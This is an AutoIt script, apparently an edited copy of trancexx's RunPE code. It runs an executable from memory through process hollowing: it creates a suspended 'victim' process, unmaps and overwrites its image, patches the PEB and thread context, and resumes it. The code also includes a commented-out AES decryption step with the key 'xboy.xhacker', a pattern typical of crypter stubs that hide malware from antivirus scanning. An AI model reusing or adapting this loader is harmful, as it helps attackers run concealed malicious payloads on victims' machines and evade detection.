; #AutoIt3Wrapper_UseX64=n ; to run x86 from ScITE in x64 environment uncomment this

;.......script written by trancexx (trancexx at yahoo dot com)
#include <Crypt.au3>
#include <WinAPIDiag.au3>
Opt("MustDeclareVars", 1)

; For this example just browse to some executable you wish to run from memory
Global $sModule = FileOpenDialog("", "", "Executable modules (*.exe)")

If @error Then Exit

Global $bBinary = FileRead($sModule)
;File Decryption
;_dec($bBinary)
Global $iNewPID

; Try 10 times in case of failures
For $i = 1 To 10
	ConsoleWrite("Try No" & $i & @CRLF)
	$iNewPID = _RunBinary($bBinary);, "", @SystemDir & "\calc.exe") ; if it fails on for example XP, try another 'victim'.
	If Not @error Then ExitLoop
Next
; Let's see if there were any errors
Switch @error
	Case 0
		ConsoleWrite("New process sucessfully created. PID is: " & $iNewPID & @CRLF)
	Case 1
		MsgBox(48, "Error", "New process couldn't be created!" & @CRLF & "Check if the path is correct.")
	Case 2
		MsgBox(48, "Error", "Wrong AutoIt!" & @CRLF & "Should be x64 for x64 and x86 for x86.")
	Case 3
		MsgBox(48, "Error", "GetThreadContext function failed!" & @CRLF & "Something is wrong.")
	Case 4
		MsgBox(48, "Error", "Binary data seems to be corrupted!" & @CRLF & "MS-DOS header is wrong or missing.")
	Case 5
		MsgBox(48, "Error", "Binary data seems to be corrupted!" & @CRLF & "PE signature is wrong.")
	Case 6
		MsgBox(48, "Error", "Wrong AutoIt!" & @CRLF & "Should be x64 for x64 and x86 for x86.")
	Case 7
		MsgBox(48, "Error", "Internal error!" & @CRLF & "Failure while writting new module binary.")
	Case 8
		MsgBox(48, "Error", "Internal error!" & @CRLF & "Failure while filling PEB structure.")
	Case 9
		MsgBox(48, "Error", "Internal error!" & @CRLF & "Failure while changing base address.")
	Case 10
		MsgBox(48, "Error", "Internal error!" & @CRLF & "Failure with SetThreadContext function.")
	Case 11
		MsgBox(48, "Error", "Internal error!" & @CRLF & "Failure with ResumeThread function.")
	Case 101
		If @extended Then
			MsgBox(48, "Error", "Error!" & @CRLF & "Not enough space available at desired address. Try again maybe, or change the 'victim'.")
		Else
			MsgBox(48, "Error", "Error!" & @CRLF & "Executable you try to run is not relocatable. This lowers the possibility of running it in this fassion." & @CRLF & "Try again or find another 'victim', maybe you'll get lucky.")
		EndIf
	Case 102
		MsgBox(48, "Error", "Itanium architecture!" & @CRLF & "No solution here. Sorry." & @CRLF & "If you want I can write a test script to determine the correct procedure of runnung this function here." & @CRLF & "I would need a feedback then.")
EndSwitch



; FUNCTION

Func _RunBinary($bBinaryImage, $sCommandLine = "", $sExeModule = @AutoItExe)

	#region 1. DETERMINE INTERPRETER TYPE


	#region 2. PREDPROCESSING PASSED
	Local $bBinary = Binary($bBinaryImage) ; this is redundant but still...
	; Make structure out of binary data that was passed
	;MsgBox(0,"File Size:",BinaryLen($bBinary))
	Local $tBinary = DllStructCreate("byte[" & BinaryLen($bBinary) & "]")
	DllStructSetData($tBinary, 1, $bBinary) ; fill it
	; Get pointer to it
	Local $pPointer = DllStructGetPtr($tBinary)

	;MsgBox(0,"Binary File",DllStructGetData($tBinary,1))

	#region 3. CREATING NEW PROCESS
	; STARTUPINFO structure (actually all that really matters is allocated space)
	Local $tSTARTUPINFO = DllStructCreate("dword  cbSize;" & _
			"ptr Reserved;" & _
			"ptr Desktop;" & _
			"ptr Title;" & _
			"dword X;" & _
			"dword Y;" & _
			"dword XSize;" & _
			"dword YSize;" & _
			"dword XCountChars;" & _
			"dword YCountChars;" & _
			"dword FillAttribute;" & _
			"dword Flags;" & _
			"word ShowWindow;" & _
			"word Reserved2;" & _
			"ptr Reserved2;" & _
			"ptr hStdInput;" & _
			"ptr hStdOutput;" & _
			"ptr hStdError")
	; This is much important. This structure will hold very some important data.
	Local $tPROCESS_INFORMATION = DllStructCreate("ptr Process;" & _
			"ptr Thread;" & _
			"dword ProcessId;" & _
			"dword ThreadId")
	; Create new process
	Local $aCall = DllCall("kernel32.dll", "bool", "CreateProcessW", _
			"wstr", $sExeModule, _
			"wstr", $sCommandLine, _
			"ptr", 0, _
			"ptr", 0, _
			"int", 0, _
			"dword", 4, _ ; CREATE_SUSPENDED ; <- this is essential
			"ptr", 0, _
			"ptr", 0, _
			"ptr", DllStructGetPtr($tSTARTUPINFO), _
			"ptr", DllStructGetPtr($tPROCESS_INFORMATION))
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		Return SetError(1, 0, 0) ; CreateProcess function or call to it failed
	Else
		MsgBox(0,"CreateProcessW",$aCall[0])
	EndIf

	; Get new process and thread handles:
	Local $hProcess = DllStructGetData($tPROCESS_INFORMATION, "Process")
	Local $hThread = DllStructGetData($tPROCESS_INFORMATION, "Thread")
	; Check for 'wrong' bit-ness. Not because it could't be implemented, but besause it would be uglyer (structures)

	#region 4. FILL CONTEXT STRUCTURE
	; CONTEXT structure is what's really important here. It's processor specific.
	Local $iRunFlag, $tCONTEXT

		$iRunFlag = 1
		$tCONTEXT = DllStructCreate("dword ContextFlags;" & _ ; Control flags
				"dword Dr0; dword Dr1; dword Dr2; dword Dr3; dword Dr6; dword Dr7;" & _ ; CONTEXT_DEBUG_REGISTERS
				"dword ControlWord; dword StatusWord; dword TagWord; dword ErrorOffset; dword ErrorSelector; dword DataOffset; dword DataSelector; byte RegisterArea[80]; dword Cr0NpxState;" & _ ; CONTEXT_FLOATING_POINT
				"dword SegGs; dword SegFs; dword SegEs; dword SegDs;" & _ ; CONTEXT_SEGMENTS
				"dword Edi; dword Esi; dword Ebx; dword Edx; dword Ecx; dword Eax;" & _ ; CONTEXT_INTEGER
				"dword Ebp; dword Eip; dword SegCs; dword EFlags; dword Esp; dword SegSs;" & _ ; CONTEXT_CONTROL
				"byte ExtendedRegisters[512]") ; CONTEXT_EXTENDED_REGISTERS

	; Define CONTEXT_FULL
	Local $CONTEXT_FULL
	Switch $iRunFlag
		Case 1
			$CONTEXT_FULL = 0x10007
		Case 2
			$CONTEXT_FULL = 0x100007
		Case 3
			$CONTEXT_FULL = 0x80027
	EndSwitch
	; Set desired access
	DllStructSetData($tCONTEXT, "ContextFlags", $CONTEXT_FULL)
	; Fill CONTEXT structure:
	$aCall = DllCall("kernel32.dll", "bool", "GetThreadContext", _
			"handle", $hThread, _
			"ptr", DllStructGetPtr($tCONTEXT))
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(3, 0, 0) ; GetThreadContext function or call to it failed
	Else
		MsgBox(0,"GetThreadContext",$aCall[0])
	EndIf
	; Pointer to PEB structure
	Local $pPEB
	Switch $iRunFlag
		Case 1
			$pPEB = DllStructGetData($tCONTEXT, "Ebx")
		Case 2
			$pPEB = DllStructGetData($tCONTEXT, "Rdx")
		Case 3
			; FIXME - Itanium architecture
	EndSwitch

	#region 5. READ PE-FORMAT
	; Start processing passed binary data. 'Reading' PE format follows.
	; First is IMAGE_DOS_HEADER
	MsgBox(0,"pPointer Before $tIMAGE_DOS_HEADER",$pPointer)
	Local $tIMAGE_DOS_HEADER = DllStructCreate("char Magic[2];" & _
			"word BytesOnLastPage;" & _
			"word Pages;" & _
			"word Relocations;" & _
			"word SizeofHeader;" & _
			"word MinimumExtra;" & _
			"word MaximumExtra;" & _
			"word SS;" & _
			"word SP;" & _
			"word Checksum;" & _
			"word IP;" & _
			"word CS;" & _
			"word Relocation;" & _
			"word Overlay;" & _
			"char Reserved[8];" & _
			"word OEMIdentifier;" & _
			"word OEMInformation;" & _
			"char Reserved2[20];" & _
			"dword AddressOfNewExeHeader", _
			$pPointer)

			MsgBox(0,"IMAGE_DOS_HEADER",DllStructGetData($tIMAGE_DOS_HEADER,"AddressOfNewExeHeader"))

	; Save this pointer value (it's starting address of binary image headers)
	Local $pHEADERS_NEW = $pPointer
	; Move pointer
	$pPointer += DllStructGetData($tIMAGE_DOS_HEADER, "AddressOfNewExeHeader") ; move to PE file header
	MsgBox(0,"Data Of Structure After Pointer Move","$pPointer"&$pPointer&@CRLF&"pHeaders_New: "&$pHEADERS_NEW)
	; Get "Magic"
	Local $sMagic = DllStructGetData($tIMAGE_DOS_HEADER, "Magic")
	; Check if it's valid format
	If Not ($sMagic == "MZ") Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(4, 0, 0) ; MS-DOS header missing.
	EndIf
	; In place of IMAGE_NT_SIGNATURE
	Local $tIMAGE_NT_SIGNATURE = DllStructCreate("dword Signature", $pPointer)
	; Move pointer
	$pPointer += 4 ; size of $tIMAGE_NT_SIGNATURE structure
	; Check signature
	MsgBox(0,"Signature: ",DllStructGetData($tIMAGE_NT_SIGNATURE, "Signature"))
	If DllStructGetData($tIMAGE_NT_SIGNATURE, "Signature") <> 17744 Then ; IMAGE_NT_SIGNATURE
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(5, 0, 0) ; wrong signature. For PE image should be "PE\0\0" or 17744 dword.
	EndIf
	; In place of IMAGE_FILE_HEADER
	Local $tIMAGE_FILE_HEADER = DllStructCreate("word Machine;" & _
			"word NumberOfSections;" & _
			"dword TimeDateStamp;" & _
			"dword PointerToSymbolTable;" & _
			"dword NumberOfSymbols;" & _
			"word SizeOfOptionalHeader;" & _
			"word Characteristics", _
			$pPointer)
	; I could check here if the module is relocatable
	;    Local $fRelocatable
	;    If BitAND(DllStructGetData($tIMAGE_FILE_HEADER, "Characteristics"), 1) Then $fRelocatable = False
	; But I won't (will check data in IMAGE_DIRECTORY_ENTRY_BASERELOC instead)
	; Get number of sections
	Local $iNumberOfSections = DllStructGetData($tIMAGE_FILE_HEADER, "NumberOfSections")
	MsgBox(0,"Number Of Sections",$iNumberOfSections)
	; Move pointer
	$pPointer += 20 ; size of $tIMAGE_FILE_HEADER structure
	; In place of IMAGE_OPTIONAL_HEADER
	Local $tMagic = DllStructCreate("word Magic;", $pPointer)
	Local $iMagic = DllStructGetData($tMagic, 1)
	Local $tIMAGE_OPTIONAL_HEADER
	If $iMagic = 267 Then ; x86 version

		$tIMAGE_OPTIONAL_HEADER = DllStructCreate("word Magic;" & _
				"byte MajorLinkerVersion;" & _
				"byte MinorLinkerVersion;" & _
				"dword SizeOfCode;" & _
				"dword SizeOfInitializedData;" & _
				"dword SizeOfUninitializedData;" & _
				"dword AddressOfEntryPoint;" & _
				"dword BaseOfCode;" & _
				"dword BaseOfData;" & _
				"dword ImageBase;" & _
				"dword SectionAlignment;" & _
				"dword FileAlignment;" & _
				"word MajorOperatingSystemVersion;" & _
				"word MinorOperatingSystemVersion;" & _
				"word MajorImageVersion;" & _
				"word MinorImageVersion;" & _
				"word MajorSubsystemVersion;" & _
				"word MinorSubsystemVersion;" & _
				"dword Win32VersionValue;" & _
				"dword SizeOfImage;" & _
				"dword SizeOfHeaders;" & _
				"dword CheckSum;" & _
				"word Subsystem;" & _
				"word DllCharacteristics;" & _
				"dword SizeOfStackReserve;" & _
				"dword SizeOfStackCommit;" & _
				"dword SizeOfHeapReserve;" & _
				"dword SizeOfHeapCommit;" & _
				"dword LoaderFlags;" & _
				"dword NumberOfRvaAndSizes", _
				$pPointer)
		; Move pointer
		$pPointer += 96 ; size of $tIMAGE_OPTIONAL_HEADER
	ElseIf $iMagic = 523 Then ; x64 version

			DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
			Return SetError(6, 0, 0) ; incompatible versions
	Else
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(6, 0, 0) ; incompatible versions
	EndIf
	; Extract entry point address
	Local $iEntryPointNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "AddressOfEntryPoint") ; if loaded binary image would start executing at this address
	; And other interesting informations
	Local $iOptionalHeaderSizeOfHeadersNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "SizeOfHeaders")
	Local $pOptionalHeaderImageBaseNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "ImageBase") ; address of the first byte of the image when it's loaded in memory
	Local $iOptionalHeaderSizeOfImageNEW = DllStructGetData($tIMAGE_OPTIONAL_HEADER, "SizeOfImage") ; the size of the image including all headers
	; Move pointer
	$pPointer += 8 ; skipping IMAGE_DIRECTORY_ENTRY_EXPORT
	$pPointer += 8 ; size of $tIMAGE_DIRECTORY_ENTRY_IMPORT
	$pPointer += 24 ; skipping IMAGE_DIRECTORY_ENTRY_RESOURCE, IMAGE_DIRECTORY_ENTRY_EXCEPTION, IMAGE_DIRECTORY_ENTRY_SECURITY
	; Base Relocation Directory
	Local $tIMAGE_DIRECTORY_ENTRY_BASERELOC = DllStructCreate("dword VirtualAddress; dword Size", $pPointer)
	; Collect data
	Local $pAddressNewBaseReloc = DllStructGetData($tIMAGE_DIRECTORY_ENTRY_BASERELOC, "VirtualAddress")
	Local $iSizeBaseReloc = DllStructGetData($tIMAGE_DIRECTORY_ENTRY_BASERELOC, "Size")
	Local $fRelocatable
	If $pAddressNewBaseReloc And $iSizeBaseReloc Then $fRelocatable = True
	MsgBox(0,"Relocatable Status: ",$fRelocatable)
	If Not $fRelocatable Then ConsoleWrite("!!!NOT RELOCATABLE MODULE. I WILL TRY BUT THIS MAY NOT WORK!!!" & @CRLF) ; nothing can be done here
	; Move pointer
	$pPointer += 88 ; size of the structures before IMAGE_SECTION_HEADER (16 of them).

	#region 6. ALLOCATE 'NEW' MEMORY SPACE
	Local $fRelocate
	Local $pZeroPoint
	If $fRelocatable Then ; If the module can be relocated then allocate memory anywhere possible
		$pZeroPoint = _RunBinary_AllocateExeSpace($hProcess, $iOptionalHeaderSizeOfImageNEW)
		; In case of failure try at original address
		If @error Then
			$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
			If @error Then
				_RunBinary_UnmapViewOfSection($hProcess, $pOptionalHeaderImageBaseNEW)
				; Try now
				$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
				If @error Then
					; Return special error number:
					DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
					Return SetError(101, 1, 0)
				EndIf
			EndIf
		EndIf
		$fRelocate = True
	Else ; And if not try where it should be
		$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
		If @error Then
			_RunBinary_UnmapViewOfSection($hProcess, $pOptionalHeaderImageBaseNEW)
			; Try now
			$pZeroPoint = _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pOptionalHeaderImageBaseNEW, $iOptionalHeaderSizeOfImageNEW)
			If @error Then
				; Return special error number:
				DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
				Return SetError(101, 0, 0)
			EndIf
		EndIf
	EndIf
	; If there is new ImageBase value, save it
	DllStructSetData($tIMAGE_OPTIONAL_HEADER, "ImageBase", $pZeroPoint)

	#region 7. CONSTRUCT THE NEW MODULE
	; Allocate enough space (in our space) for the new module
	Local $tModule = DllStructCreate("byte[" & $iOptionalHeaderSizeOfImageNEW & "]")
	; Get pointer
	Local $pModule = DllStructGetPtr($tModule)
	; Headers
	Local $tHeaders = DllStructCreate("byte[" & $iOptionalHeaderSizeOfHeadersNEW & "]", $pHEADERS_NEW)

	MsgBox(0,"Dll Struct Data",DllStructGetData($tHeaders,1))
	MsgBox(0,"Dll Struct Data",FileRead($pHEADERS_NEW))
	; Write headers to $tModule
	DllStructSetData($tModule, 1, DllStructGetData($tHeaders, 1))
	; Write sections now. $pPointer is currently in place of sections
	Local $tIMAGE_SECTION_HEADER
	Local $iSizeOfRawData, $pPointerToRawData
	Local $iVirtualAddress, $iVirtualSize
	Local $tRelocRaw
	; Loop through sections
	For $i = 1 To $iNumberOfSections
		$tIMAGE_SECTION_HEADER = DllStructCreate("char Name[8];" & _
				"dword UnionOfVirtualSizeAndPhysicalAddress;" & _
				"dword VirtualAddress;" & _
				"dword SizeOfRawData;" & _
				"dword PointerToRawData;" & _
				"dword PointerToRelocations;" & _
				"dword PointerToLinenumbers;" & _
				"word NumberOfRelocations;" & _
				"word NumberOfLinenumbers;" & _
				"dword Characteristics", _
				$pPointer)
		; Collect data
		$iSizeOfRawData = DllStructGetData($tIMAGE_SECTION_HEADER, "SizeOfRawData")
		$pPointerToRawData = $pHEADERS_NEW + DllStructGetData($tIMAGE_SECTION_HEADER, "PointerToRawData")
		$iVirtualAddress = DllStructGetData($tIMAGE_SECTION_HEADER, "VirtualAddress")
		$iVirtualSize = DllStructGetData($tIMAGE_SECTION_HEADER, "UnionOfVirtualSizeAndPhysicalAddress")
		If $iVirtualSize And $iVirtualSize < $iSizeOfRawData Then $iSizeOfRawData = $iVirtualSize
		; If there is data to write, write it
		If $iSizeOfRawData Then
			;MsgBox(0,"Addresses","pModuel: "&$pModule&@CRLF&"Virtual Address: "&$iVirtualAddress&@CRLF&"pModule+iVirtualAddress: "&$pModule+$iVirtualAddress)
			Local $tempStruct = DllStructCreate("byte[" & $iSizeOfRawData & "]", $pModule + $iVirtualAddress)
			;_WinAPI_DisplayStruct($tempStruct)
			Local $tempStruct1 = DllStructCreate("byte[" & $iSizeOfRawData & "]", $pPointerToRawData)
			;_WinAPI_DisplayStruct($tempStruct1)
			;MsgBox(0,"TempStruct 1 element",DllStructGetData($tempStruct1, 1))
			DllStructSetData($tempStruct, 1, DllStructGetData($tempStruct1, 1))
		EndIf
		; Relocations
		If $fRelocate Then
			If $iVirtualAddress <= $pAddressNewBaseReloc And $iVirtualAddress + $iSizeOfRawData > $pAddressNewBaseReloc Then
				MsgBox(0,"RelocRaw Instialized",$i)
				$tRelocRaw = DllStructCreate("byte[" & $iSizeBaseReloc & "]", $pPointerToRawData + ($pAddressNewBaseReloc - $iVirtualAddress))
			EndIf
		EndIf
		; Move pointer
		$pPointer += 40 ; size of $tIMAGE_SECTION_HEADER structure
	Next
	; Fix relocations
	;_WinAPI_DisplayStruct($tRelocRaw)
	If $fRelocate Then _RunBinary_FixReloc($pModule, $tRelocRaw, $pZeroPoint, $pOptionalHeaderImageBaseNEW, $iMagic = 523)
	; Write newly constructed module to allocated space inside the $hProcess
	$aCall = DllCall("kernel32.dll", "bool", "WriteProcessMemory", _
			"handle", $hProcess, _
			"ptr", $pZeroPoint, _
			"ptr", $pModule, _
			"dword_ptr", $iOptionalHeaderSizeOfImageNEW, _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(7, 0, 0) ; WriteProcessMemory function or call to it while writting new module binary
	EndIf

	#region 8. PEB ImageBaseAddress MANIPULATION
	; PEB structure definition
	Local $tPEB = DllStructCreate("byte InheritedAddressSpace;" & _
			"byte ReadImageFileExecOptions;" & _
			"byte BeingDebugged;" & _
			"byte Spare;" & _
			"ptr Mutant;" & _
			"ptr ImageBaseAddress;" & _
			"ptr LoaderData;" & _
			"ptr ProcessParameters;" & _
			"ptr SubSystemData;" & _
			"ptr ProcessHeap;" & _
			"ptr FastPebLock;" & _
			"ptr FastPebLockRoutine;" & _
			"ptr FastPebUnlockRoutine;" & _
			"dword EnvironmentUpdateCount;" & _
			"ptr KernelCallbackTable;" & _
			"ptr EventLogSection;" & _
			"ptr EventLog;" & _
			"ptr FreeList;" & _
			"dword TlsExpansionCounter;" & _
			"ptr TlsBitmap;" & _
			"dword TlsBitmapBits[2];" & _
			"ptr ReadOnlySharedMemoryBase;" & _
			"ptr ReadOnlySharedMemoryHeap;" & _
			"ptr ReadOnlyStaticServerData;" & _
			"ptr AnsiCodePageData;" & _
			"ptr OemCodePageData;" & _
			"ptr UnicodeCaseTableData;" & _
			"dword NumberOfProcessors;" & _
			"dword NtGlobalFlag;" & _
			"byte Spare2[4];" & _
			"int64 CriticalSectionTimeout;" & _
			"dword HeapSegmentReserve;" & _
			"dword HeapSegmentCommit;" & _
			"dword HeapDeCommitTotalFreeThreshold;" & _
			"dword HeapDeCommitFreeBlockThreshold;" & _
			"dword NumberOfHeaps;" & _
			"dword MaximumNumberOfHeaps;" & _
			"ptr ProcessHeaps;" & _
			"ptr GdiSharedHandleTable;" & _
			"ptr ProcessStarterHelper;" & _
			"ptr GdiDCAttributeList;" & _
			"ptr LoaderLock;" & _
			"dword OSMajorVersion;" & _
			"dword OSMinorVersion;" & _
			"dword OSBuildNumber;" & _
			"dword OSPlatformId;" & _
			"dword ImageSubSystem;" & _
			"dword ImageSubSystemMajorVersion;" & _
			"dword ImageSubSystemMinorVersion;" & _
			"dword GdiHandleBuffer[34];" & _
			"dword PostProcessInitRoutine;" & _
			"dword TlsExpansionBitmap;" & _
			"byte TlsExpansionBitmapBits[128];" & _
			"dword SessionId")
	; Fill the structure
	$aCall = DllCall("kernel32.dll", "bool", "ReadProcessMemory", _
			"ptr", $hProcess, _
			"ptr", $pPEB, _ ; pointer to PEB structure
			"ptr", DllStructGetPtr($tPEB), _
			"dword_ptr", DllStructGetSize($tPEB), _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(8, 0, 0) ; ReadProcessMemory function or call to it failed while filling PEB structure
	EndIf
	; Change base address within PEB
	DllStructSetData($tPEB, "ImageBaseAddress", $pZeroPoint)
	; Write the changes
	$aCall = DllCall("kernel32.dll", "bool", "WriteProcessMemory", _
			"handle", $hProcess, _
			"ptr", $pPEB, _
			"ptr", DllStructGetPtr($tPEB), _
			"dword_ptr", DllStructGetSize($tPEB), _
			"dword_ptr*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(9, 0, 0) ; WriteProcessMemory function or call to it failed while changing base address
	EndIf

	#region 9. NEW ENTRY POINT
	; Entry point manipulation
	Switch $iRunFlag
		Case 1
			DllStructSetData($tCONTEXT, "Eax", $pZeroPoint + $iEntryPointNEW)
		Case 2
			DllStructSetData($tCONTEXT, "Rcx", $pZeroPoint + $iEntryPointNEW)
		Case 3
			; FIXME - Itanium architecture
	EndSwitch

	#region 10. SET NEW CONTEXT
	; New context:
	$aCall = DllCall("kernel32.dll", "bool", "SetThreadContext", _
			"handle", $hThread, _
			"ptr", DllStructGetPtr($tCONTEXT))

	If @error Or Not $aCall[0] Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(10, 0, 0) ; SetThreadContext function or call to it failed
	EndIf

	#region 11. RESUME THREAD
	; And that's it!. Continue execution:
	$aCall = DllCall("kernel32.dll", "dword", "ResumeThread", "handle", $hThread)
	; Check for errors or failure
	If @error Or $aCall[0] = -1 Then
		DllCall("kernel32.dll", "bool", "TerminateProcess", "handle", $hProcess, "dword", 0)
		Return SetError(11, 0, 0) ; ResumeThread function or call to it failed
	EndIf

	#region 12. CLOSE OPEN HANDLES AND RETURN PID
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hProcess)
	DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hThread)
	; All went well. Return new PID:
	Return DllStructGetData($tPROCESS_INFORMATION, "ProcessId")

EndFunc   ;==>_RunBinary


Func _RunBinary_FixReloc($pModule, $tData, $pAddressNew, $pAddressOld, $fImageX64)
	MsgBox(0,"iMagic in Func As fImageX64: ",$fImageX64)
	Local $iDelta = $pAddressNew - $pAddressOld ; dislocation value
	Local $iSize = DllStructGetSize($tData) ; size of data
	MsgBox(0,"Size Of tData (relocRaw)",$iSize)
	Local $pData = DllStructGetPtr($tData) ; addres of the data structure
	Local $tIMAGE_BASE_RELOCATION, $iRelativeMove = 0
	Local $iVirtualAddress, $iSizeofBlock, $iNumberOfEntries
	Local $tEnries, $iData, $tAddress
	Local $iFlag = 3 + 7 * $fImageX64 ; IMAGE_REL_BASED_HIGHLOW = 3 or IMAGE_REL_BASED_DIR64 = 10

	MsgBox(0,"iFlag",$iFlag)
	While $iRelativeMove < $iSize ; for all data available
		$tIMAGE_BASE_RELOCATION = DllStructCreate("dword VirtualAddress; dword SizeOfBlock", $pData + $iRelativeMove)
		$iVirtualAddress = DllStructGetData($tIMAGE_BASE_RELOCATION, "VirtualAddress")
		$iSizeofBlock = DllStructGetData($tIMAGE_BASE_RELOCATION, "SizeOfBlock")
		$iNumberOfEntries = ($iSizeofBlock - 8) / 2
		;MsgBox(0,"IMAGE_BASE_RELOCATION","Struct: "&$tIMAGE_BASE_RELOCATION&@CRLF&"Struct Ptr: "&DllStructGetPtr($tIMAGE_BASE_RELOCATION)&@CRLF&"Increament Struct Ptr By 8: "&DllStructGetPtr($tIMAGE_BASE_RELOCATION)+8)
		$tEnries = DllStructCreate("word[" & $iNumberOfEntries & "]", DllStructGetPtr($tIMAGE_BASE_RELOCATION) + 8)
		; Go through all entries
		For $i = 1 To $iNumberOfEntries
			$iData = DllStructGetData($tEnries, 1, $i)

			If BitShift($iData, 12) = $iFlag Then ; check type
				$tAddress = DllStructCreate("ptr", $pModule + $iVirtualAddress + BitAND($iData, 0xFFF)) ; the rest of $iData is offset
				DllStructSetData($tAddress, 1, DllStructGetData($tAddress, 1) + $iDelta) ; this is what's this all about
			EndIf
		Next
		$iRelativeMove += $iSizeofBlock
	WEnd
	Return 1 ; all OK!
EndFunc   ;==>_RunBinary_FixReloc


Func _RunBinary_AllocateExeSpaceAtAddress($hProcess, $pAddress, $iSize)
	; Allocate
	Local $aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
			"handle", $hProcess, _
			"ptr", $pAddress, _
			"dword_ptr", $iSize, _
			"dword", 0x1000, _ ; MEM_COMMIT
			"dword", 64) ; PAGE_EXECUTE_READWRITE
	; Check for errors or failure
	If @error Or Not $aCall[0] Then
		; Try differently
		$aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
				"handle", $hProcess, _
				"ptr", $pAddress, _
				"dword_ptr", $iSize, _
				"dword", 0x3000, _ ; MEM_COMMIT|MEM_RESERVE
				"dword", 64) ; PAGE_EXECUTE_READWRITE
		; Check for errors or failure
		If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Unable to allocate
	EndIf
	Return $aCall[0]
EndFunc   ;==>_RunBinary_AllocateExeSpaceAtAddress


Func _RunBinary_AllocateExeSpace($hProcess, $iSize)
	; Allocate space
	Local $aCall = DllCall("kernel32.dll", "ptr", "VirtualAllocEx", _
			"handle", $hProcess, _
			"ptr", 0, _
			"dword_ptr", $iSize, _
			"dword", 0x3000, _ ; MEM_COMMIT|MEM_RESERVE
			"dword", 64) ; PAGE_EXECUTE_READWRITE
	; Check for errors or failure
	If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Unable to allocate
	Return $aCall[0]
EndFunc   ;==>_RunBinary_AllocateExeSpace


Func _RunBinary_UnmapViewOfSection($hProcess, $pAddress)
	DllCall("ntdll.dll", "int", "NtUnmapViewOfSection", _
			"ptr", $hProcess, _
			"ptr", $pAddress)
	; Check for errors only
	If @error Then Return SetError(1, 0, 0) ; Failure
	Return 1
EndFunc   ;==>_RunBinary_UnmapViewOfSection


Func _RunBinary_IsWow64Process($hProcess)
	Local $aCall = DllCall("kernel32.dll", "bool", "IsWow64Process", _
			"handle", $hProcess, _
			"bool*", 0)
	; Check for errors or failure
	If @error Or Not $aCall[0] Then Return SetError(1, 0, 0) ; Failure
	Return $aCall[2]
EndFunc   ;==>_RunBinary_IsWow64Process


Func _dec(ByRef $fRead)

_Crypt_Startup()
Local $fDec = _Crypt_DecryptData($fRead, "xboy.xhacker", $CALG_AES_256)
$fRead = $fDec
_Crypt_Shutdown()
;$Filename = StringRegExp($iFile,"(.*?)z",1)
EndFunc


MsgBox(0,"Original File","Run From Mem FIle")